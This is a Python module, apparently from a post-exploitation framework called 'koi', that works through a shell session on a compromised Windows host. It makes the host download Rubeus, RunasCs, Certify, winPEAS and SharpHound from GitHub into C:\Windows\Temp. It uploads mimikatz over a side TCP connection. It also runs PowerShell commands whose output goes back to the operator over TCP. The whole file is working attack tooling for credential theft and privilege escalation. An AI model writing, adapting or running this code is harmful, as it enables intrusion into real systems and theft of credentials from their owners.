from __future__ import annotations

import re
import select
import socket
import tempfile
import threading
import time
import urllib.request
import uuid
import zipfile

from koi.modules.blueprint import KoiModule

_PS_PROMPT = re.compile(r'^PS\s+\S+>\s*')

MIMIKATZ_ZIP_URL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"

TOOLS: dict[str, str] = {
    "Rubeus.exe":      "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Rubeus.exe",
    "RunasCs.exe":     "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/RunasCs.exe",
    "Certify.exe":     "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Certify.exe",
    "winPEAS.exe":     "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/winPEAS.exe",
    "SharpHound.ps1":  "https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1",
}

MIMIKATZ_ZIP_URL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"


class PopulateWinModule(KoiModule):
    name        = "populate_win"
    description = "Download common exploitation tools (Rubeus, RunasCs, Certify, winPEAS, SharpHound, mimikatz) on the target."
    usage       = "populate_win <id> [-o <remote_dir>]"
    category    = "Other"
    platform    = "windows_ps"
    arguments   = [
        {
            "flags":   ["-o", "--output-dir"],
            "default": "C:\\Windows\\Temp",
            "help":    "Remote directory where tools will be saved",
        },
    ]

    def _win_query(self, ps_expr: str, timeout: float = 60.0) -> str:
        """
        Run a PowerShell expression on the remote target and return its output.
        Handles both plain and upgraded (ConPtyShell) sessions.
        """
        if self.session.upgraded:
            return self._win_query_sidechannel(ps_expr, timeout)

        sentinel = uuid.uuid4().hex
        marker   = f"__KOI_{sentinel}__"

        if self.session.os_type == "windows_ps":
            cmd = f"({ps_expr}); '{marker}'"
        else:
            inner = f"({ps_expr}); '{marker}'"
            cmd   = f'powershell -NoProfile -NonInteractive -c "{inner}"'

        eol = self.session.eol
        enc = self.session.encoding
        self.session.conn.sendall((cmd + eol).encode(enc))

        buf      = b""
        deadline = time.monotonic() + timeout
        lines: list[str] = []

        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            r, _, _ = select.select([self.session.conn], [], [], min(remaining, 0.1))
            if not r:
                continue
            chunk = self.session.conn.recv(4096)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                raw, buf = buf.split(b"\n", 1)
                text = raw.decode(enc, errors="replace").strip("\r\n ")
                text = _PS_PROMPT.sub("", text).strip()
                if not text or "Write-Host" in text:
                    continue
                if marker in text:
                    return lines[-1] if lines else ""
                lines.append(text)

        return lines[-1] if lines else ""

    def _win_query_sidechannel(self, ps_expr: str, timeout: float = 60.0) -> str:
        """Variant for upgraded (ConPtyShell) sessions — result returned via side TCP socket."""
        local_ip = self._get_local_ip()
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", 0))
        srv.listen(1)
        srv.settimeout(timeout)
        port = srv.getsockname()[1]

        ps_cmd = (
            f"$_r=({ps_expr})|Out-String;"
            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
            f"$_s=$_c.GetStream();"
            f"$_b=[Text.Encoding]::UTF8.GetBytes($_r.Trim());"
            f"$_s.Write($_b,0,$_b.Length);"
            f"$_s.Flush();$_c.Close()"
        )
        self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))

        try:
            conn, _ = srv.accept()
            data = b""
            while chunk := conn.recv(4096):
                data += chunk
            conn.close()
            return data.decode("utf-8", errors="replace").strip()
        except socket.timeout:
            return ""
        finally:
            srv.close()

    def _get_local_ip(self) -> str:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((self.session.addr[0], 80))
            return s.getsockname()[0]
        finally:
            s.close()

    def _download_tool(self, name: str, url: str, dest: str) -> bool:
        """Download *url* to *dest* on the remote target. Returns True on success."""
        ps = f"(New-Object Net.WebClient).DownloadFile('{url}','{dest}')"

        if self.session.upgraded:
            self.session.conn.sendall((ps + "\r\n").encode(self.session.encoding))
            time.sleep(0.3)
            r, _, _ = select.select([self.session.conn], [], [], 1.0)
            if r:
                self.session.conn.recv(4096)
        elif self.session.os_type == "windows_ps":
            self.sendline(ps)
        else:
            escaped = ps.replace('"', '\\"')
            self.sendline(f'powershell -NoProfile -NonInteractive -c "{escaped}"')

        time.sleep(2.0)

        check = self._win_query(f"(Test-Path '{dest}').ToString()")
        return check.strip().lower() == "true"

    def _fetch_mimikatz_exe(self) -> bytes:
        """Download mimikatz_trunk.zip locally and return the x64/mimikatz.exe bytes."""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            tmp_path = tmp.name
        try:
            urllib.request.urlretrieve(MIMIKATZ_ZIP_URL, tmp_path)
            with zipfile.ZipFile(tmp_path) as zf:
                return zf.read("x64/mimikatz.exe")
        finally:
            import os
            os.unlink(tmp_path)

    def _upload_exe(self, raw: bytes, dest: str) -> bool:
        """Upload raw bytes to *dest* on the target via a side TCP connection."""
        local_ip = self._get_local_ip()
        total    = len(raw)

        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", 0))
        srv.listen(1)
        srv.settimeout(30)
        port = srv.getsockname()[1]

        error: list[str] = []

        def _send():
            try:
                conn, _ = srv.accept()
                sent = 0
                while sent < total:
                    chunk = raw[sent: sent + 65536]
                    conn.sendall(chunk)
                    sent += len(chunk)
                conn.close()
            except Exception as exc:
                error.append(str(exc))
            finally:
                srv.close()

        t = threading.Thread(target=_send, daemon=True)
        t.start()

        ps_cmd = (
            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
            f"$_s=$_c.GetStream();"
            f"$_f=[IO.File]::OpenWrite('{dest}');"
            f"$_b=New-Object byte[] 65536;"
            f"while(($_n=$_s.Read($_b,0,$_b.Length))-gt 0){{$_f.Write($_b,0,$_n)}};"
            f"$_f.Close();$_c.Close()"
        )

        if self.session.upgraded:
            self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
            time.sleep(0.3)
            r, _, _ = select.select([self.session.conn], [], [], 1.0)
            if r:
                self.session.conn.recv(4096)
        elif self.session.os_type == "windows_ps":
            self.sendline(ps_cmd)
        else:
            escaped = ps_cmd.replace('"', '\\"')
            self.sendline(f'powershell -NoProfile -NonInteractive -c "{escaped}"')

        t.join(timeout=30)

        if error:
            return False

        time.sleep(1.0)
        check = self._win_query(f"(Test-Path '{dest}').ToString()")
        return check.strip().lower() == "true"

    def run(self) -> None:
        out_dir = (self.args.output_dir or "C:\\Windows\\Temp").rstrip("\\")

        self.status(f"Populating {out_dir} with exploitation tools…")
        print()

        results: dict[str, str] = {}

        for name, url in TOOLS.items():
            dest = f"{out_dir}\\{name}"
            with self.spinner(f"Downloading {name}…"):
                try:
                    ok = self._download_tool(name, url, dest)
                except Exception as exc:
                    ok = False
                    results[name] = f"error: {exc}"
                    continue
            results[name] = dest if ok else "FAILED"

        dest = f"{out_dir}\\mimikatz.exe"
        with self.spinner("Downloading mimikatz locally and uploading…"):
            try:
                raw = self._fetch_mimikatz_exe()
                ok  = self._upload_exe(raw, dest)
            except Exception as exc:
                ok = False
                results["mimikatz.exe"] = f"error: {exc}"
        if "mimikatz.exe" not in results:
            results["mimikatz.exe"] = dest if ok else "FAILED"

        from koi.utils.ui import _y, _r, _gr
        display = {}
        for name, val in results.items():
            if val == "FAILED" or val.startswith("error"):
                display[name] = _r(val)
            else:
                display[name] = _y(val)

        print()
        self.box("populate_win results", display)
